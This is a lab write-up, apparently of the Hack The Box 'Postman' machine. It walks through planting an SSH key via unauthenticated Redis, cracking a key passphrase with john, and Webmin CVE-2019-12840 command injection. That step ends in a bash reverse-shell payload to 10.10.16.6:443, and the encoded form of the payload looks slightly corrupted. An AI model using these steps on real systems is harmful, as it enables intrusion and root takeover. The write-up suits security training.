1,Recon
port scan
	22/tcp ssh`OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`
	80/tcp http `Apache httpd 2.4.29`
	6379/tcp redis `Redis key-value store 4.0.9`
	10000/tcp http `MiniServ 1.910 (Webmin httpd)`
Check the services:
port 80: This is a introduction page, and by enumerating the web-content
```
There are only a few useful urls for us.
/css /images /js /upload
```
When we check them, it would redirect to file console:
![](images/Pasted%20image%2020240921090504.png)
But I can not find anything useful for us.

port 6379 redis
```
Redis is an open-source, in-memory data structure store, primarily used as a database, cache, and message broker. It supports various data structures such as strings, hashes, lists, sets, and sorted sets, among others. Redis is known for its high performance and supports operations like automatic persistence, replication, and clustering.
```

We can use `netcat` and `redis-cli` interact with redis.
```
I can interact with Redis just using nc. I can run keys to list the current keys:
nc 10.10.10.160 6379 
keys *
*0

This redis instance has nothing in it. I can add something:
10.10.10.160:6379> keys *
(empty array)
10.10.10.160:6379> incr wither
(integer) 1
10.10.10.160:6379> keys *
1) "wither"
```

port 10000 http:
This service for us, we have known its version `MiniServ 1.910 (Webmin httpd)`
![](images/Pasted%20image%2020240921090918.png)
We need to put this hostname into our hosts file.
Then we get a login page:
![](images/Pasted%20image%2020240921091106.png)

We don't have any credits, so let's come to check the version of the service and find something exploitable.
`Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)` 
From the exploit-db, but it seems need the valid credit.

Strategy for exploit redis
```
Since I can write to redis, I basically have almost arbitrary write on the file system as the user redis is running as by writing the database to a file with the save command. The reason it’s “almost arbitrary” is because I can’t cleanly write a file, but rather, I can write my content with junk on either side. But there are many file-based attacks on Linux that are robust to the extra junk. For example, writing an SSH key. sshd will ignore the junk lines, and process lines that have a public key in the authorized_keys file.

```

I can check the current directory for redis:
```
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

I can make that guess that this is likely the user that runs the redis server’s home directory. I can confirm that by changing the current directory to ./.ssh:
```
10.10.10.160:6379> config set dir ./.ssh
OK
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

The fact that that command works indicates that directory exists, and which suggests this is a home directory for this user.
I'll add my `id_rsa.pub` to a file with some extra newlines before and after the key:
```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
```

```
Redis is going to write a binary database file into authorized_keys, where sshd is then going to open that file as an ASCII text file and read it line by line, looking for a public key that matches the private key being sent to it. The newlines will help make sure that the public key is on its own line in the file.
```

I can use the -x options in redis-cli which will “read the last argument from STDIN” to cat this file into redis-cli and set it’s value into the database:
```
cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set wither
```

Next I’ll tell redis that the dbname is authorized_keys, and then save:
```
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

Now I can get a shell with SSH.

There is only one user `Matt` but we don't have permission to check anything of him.
But I found another one file in `/opt`: `id_rsa.bak` and we can read it directly.

Then of course we need to crack it. :)
```
ssh2john id_rsa > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)     
1g 0:00:00:00 DONE (2024-09-21 09:34) 5.263g/s 1299Kp/s 1299Kc/s 1299KC/s comunista..comett
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Then we get the passphrase `computer2008`

Very sad, ssh login failed.
```
ssh -i id_rsa Matt@10.10.10.160      
Enter passphrase for key 'id_rsa': 
Connection closed by 10.10.10.160 port 22
```

Let's try `su Matt` and hope he use the same credit for his account.
(Thanks God !!!!!)

3,shell as root
Firstly I really like check `sudo -l` but very sadly, Matt could not do anything as root.
```
sudo -l
Sorry, user Matt may not run sudo on Postman.
```
Then I would continue check `.bash_history`
```
su root
mv SimpleHTTPPutServer.py /var/www/html/
mkdir server
mv server server/
mv server.py server/
cd server
```
I am very curious about the directory server.
```
SimpleHTTPPutServer.py
# python -m SimpleHTTPPutServer 8080
import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))


if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```
But I have check the `netstate` and there is no port 8080 service.
```
netstat -ntlp
0.0.0.0:6379 redis
127.0.0.53:53 DNS
0.0.0.0:10000 webmin
0.0.0.0:22 ssh
```
In this place, I only did not check the service of port 10000.
Then use the `Matt:computer2008` credit we finally login in to the `webmin`
![](images/Pasted%20image%2020240921095321.png)
We have get the Webmin version `1.9.10`
We can try to use the previous poc `Webmin 1.910 - Remote Code Execution`
or run the exploit script from msf.

 It’s very common that webmin uses the system’s authentication.
 Matt does not have access to do much:
![](images/Pasted%20image%2020240921101655.png)

CVE-2019-12840 is described on Packet Storm as:
`https://github.com/KentVolt/Webmin-1.910-Exploit.git`
```
An arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.
```
It turns out that’s the one thing Matt can do!

The package updater is vulnerable to command injection through the u POST parameter. Click on System on the panel to the left, then click on Software Package Updates . Turn on Burp intercept and click on Update Select Packages .
![](images/Pasted%20image%2020240921102623.png)

A request to `/package-updates/update.cgi` should be intercepted, send this to Burp Repeater
and remove all the parameters. Add the following payload to the end of the request:
`u=acl%2Fapt&u=$(whoami)`

This should execute whoami before the apt update command. Once the page returns, scroll to the bottom to look at the output.
![](images/Pasted%20image%2020240921102721.png)
It's seen that the server tried to install a package named root , which was the output of `whoami` Similarly, a bash reverse shell can be executed.

the payload would be 
```
bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"

In this place, every symbol need to encode with url encode
like '+' %2b,  '=' %3d.

u=acl%2Fapt&u=$(echo${IFS}YmFzaCAtYyAiYmFzaCAtaSA%2bcat JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0MyAwPiYxIg%3d%3d|base64${IFS}-d|bash)
```

Of course, we can use the msf

Then we can get the root shell.
![](images/Pasted%20image%2020240921105610.png)
![](images/Pasted%20image%2020240921105518.png)
PS: remember do not write the virtual host name in the `RHOST` position, it would blocking reverse shells.

Then we can get the root shell.
